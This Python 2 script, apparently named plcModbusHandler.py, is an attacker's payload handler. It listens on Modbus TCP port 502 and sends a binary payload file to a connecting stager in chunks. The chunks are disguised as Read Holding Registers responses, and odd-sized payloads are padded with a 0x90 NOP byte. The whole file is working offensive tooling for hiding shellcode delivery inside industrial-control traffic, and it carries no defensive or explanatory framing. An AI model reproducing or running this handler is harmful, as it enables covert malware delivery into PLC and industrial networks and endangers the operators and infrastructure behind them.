#!/usr/bin/env python
import sys
import argparse
import os
import socket
import struct
import binascii

class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[32m'
    RED = '\033[0;31m'
    DEFAULT = '\033[0m'
    ORANGE = '\033[33m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    BR_COLOUR = '\033[1;37;40m'

TIMEOUT = 2
PORT = 502
SERVER = "0.0.0.0"
# http://www.modbus.org/docs/Modbus_Application_Protocol_V1_1b.pdf
READ_HOLDING = "03"  # Read Holding Registers


def get_args():
    parser = argparse.ArgumentParser(
        prog='plcModbusHandler.py',
        usage='%(prog)s -f <payload.bin>')

    parser.add_argument('-f', metavar='<payload.bin>', help='Payload to be fetched by the stager',required=True)
    args = parser.parse_args()
    return args


# Just certain format to print the modbus data to stdout. Scapy would be better here...
def format_print(payload):
    modbus_tcp_s = ' '.join(payload[0:14][i:i + 2] for i in range(0, len(payload[0:14]), 2))
    modbus_s = ' '.join(payload[14:][i:i + 2] for i in range(0, len(payload[14:]), 2))
    return Colors.GREEN + modbus_tcp_s + Colors.BLUE + " " + modbus_s + Colors.DEFAULT


# Return a string with the modbus header
def create_header_modbus(length):
    trans_id = "0001"
    proto_id = "0000"
    unit_id = "01"
    return trans_id + proto_id + length + unit_id


# Check if the modbus request is ok
def check_data(data):
    print Colors.ORANGE + "    Rx: " + format_print(data.encode('hex'))
    if len(data) != 12 and data.encode("hex")[10:16] != '060103': # Just a silly check
        return False
    return True


# Returns a Modbus socket descriptor.
def modbus_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind((SERVER, PORT))
    except socket.error as e:
        print Colors.RED + '[-] Exception: Bind socket failed: ' + e[1] + Colors.DEFAULT
        sys.exit()
    return s


# Tx/Rx  Modbus data
def start_service(file):

    try:
        f = open(file, "rb")
    except (IOError, OSError) as e:
        print Colors.RED + "[-] Exception: %s" % (e) + Colors.DEFAULT
        sys.exit(1)

    size_payload = os.path.getsize(file)
    print Colors.ORANGE + '[+] Payload size:  %d' % (size_payload) + Colors.DEFAULT

    s = modbus_socket()
    s.listen(1)
    print Colors.ORANGE + '[+] Socket listening on %s:%d' % (SERVER,PORT) + Colors.DEFAULT

    conn, addr = s.accept()
    print Colors.ORANGE + '[+] Client connected: ' + addr[0] + ':' + str(addr[1]) + Colors.DEFAULT

    data = conn.recv(12)

    if not check_data(data):
        conn.close()
        exit(1)

    # Send size payload. The handler ignores the addr base
    payload = create_header_modbus('0007') + READ_HOLDING + '04' + struct.pack('<i', size_payload).encode('hex')  # 00 01 00 00 00 07 01 03 04 XX XX XX XX
    conn.send(binascii.unhexlify(payload))
    print Colors.ORANGE + "    Tx: " + format_print(payload) + "\n"

    while size_payload:
        data = conn.recv(12)
        if not check_data(data):
            conn.close()
            exit(1)

        chunksize_hex = data[10:12].encode('hex')
        size_bytes = int(chunksize_hex, 16) * 2  # chunk value in words
        chunk = f.read(size_bytes).encode('hex')
        payload = create_header_modbus(format(size_bytes + 3, '04x')) + READ_HOLDING + format(len(chunk)/2,'02x') + chunk
        print Colors.ORANGE + "    Tx: " + format_print(payload) + "\n"
        conn.send(binascii.unhexlify(payload))
        size_payload -= size_bytes

    conn.close()
    print Colors.BOLD + '[+] Payload sent :D' + Colors.DEFAULT


# If the file has an odd number of bytes it's padded with a nop
def pad_file(file):
    try:
        size = os.path.getsize(file)
        if size % 2 != 0:
            f = open(file, "ab")
            f.write(binascii.unhexlify('90'))
            print Colors.ORANGE + '[+] File padded with an extra 0x90' + Colors.DEFAULT
            f.close()

    except (IOError, OSError) as e:
        print Colors.RED + "[-] Exception: %s" % (e) + Colors.DEFAULT
        sys.exit(1)


def main():
    print Colors.BR_COLOUR + "Modbus Handler: " + Colors.DEFAULT
    args = get_args()

    pad_file(args.f)
    start_service(args.f)

if __name__ == '__main__':
    main()
